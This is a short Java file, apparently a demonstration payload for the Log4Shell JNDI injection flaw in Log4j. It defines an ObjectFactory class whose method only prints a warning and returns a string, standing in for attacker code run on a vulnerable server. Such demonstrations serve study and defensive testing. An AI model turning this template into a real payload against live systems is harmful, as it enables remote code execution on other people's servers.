import javax.naming.spi.ObjectFactory;
import javax.naming.Name;
import javax.naming.Context;
import java.util.Hashtable;

public class Log4Shell implements ObjectFactory {
    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameContext, Hashtable<?, ?> environment) {
        System.out.println("WARNING: This is an arbitrary command run from Log4Shell.java!");
        return "Oops";
    }
}

